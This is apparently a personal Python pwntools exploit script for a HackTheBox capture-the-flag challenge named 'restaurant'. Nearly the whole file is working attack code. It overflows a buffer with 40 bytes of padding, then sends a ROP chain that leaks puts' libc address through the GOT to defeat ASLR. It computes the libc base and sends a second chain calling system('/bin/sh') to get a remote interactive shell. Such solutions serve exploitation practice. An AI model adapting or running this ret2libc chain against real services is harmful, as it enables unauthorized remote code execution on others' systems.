#restaurant
import os
from pwn import *
level = "restaurant"
ip = "144.126.224.196:30342"
os.chdir("/home/ayush/Work/HackTheBox/Challenges/PWN/"+level)
print(os.getcwd())
######################## Craft ROP exploit to leak any library function’s address ##############################
context.arch = 'amd64'
libc = ELF("./libc.so.6")
elf = ELF("./restaurant")

overflow = b'A' * 40
#r = process(./restaurant)
r = remote(ip.split(':')[0], ip.split(':')[1])

r.sendlineafter("> ", "1")

rop_elf = ROP(elf)
###### to go to next line(kind of like printing \n)
rop_elf.call(elf.plt['puts'], [next(elf.search(b""))])
rop_elf.call(elf.plt['puts'], [elf.got['puts']])
###### to understand the stack alignment
print(rop_elf.dump())
rop_elf.call((rop_elf.find_gadget(["ret"]))[0])
rop_elf.call(elf.symbols['fill'])

rop_get_libc_aslr_addr = overflow + rop_elf.chain()
log.info(rop_elf.dump())

r.sendlineafter(">", rop_get_libc_aslr_addr)
r.recvuntil("\n")
r.recvuntil("\n")
leaked_addr_puts_libc = u64(r.recvuntil("\n").strip().ljust(8, b"\x00"))
######################find libc version and set it in ROP############################################
server_libc_base_addr = leaked_addr_puts_libc - libc.symbols['puts']
log.info("Leaked server's libc address, puts(): " + hex(server_libc_base_addr))

libc.address = server_libc_base_addr
##########################Craft ROP exploit to system call Bash#####################################
rop_libc = ROP(libc)
rop_libc.call((rop_libc.find_gadget(["ret"]))[0])
rop_libc.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])

rop_get_bash_exploit = overflow + rop_libc.chain()
log.info(rop_libc.dump())

r.sendlineafter(">" ,rop_get_bash_exploit)

r.interactive()
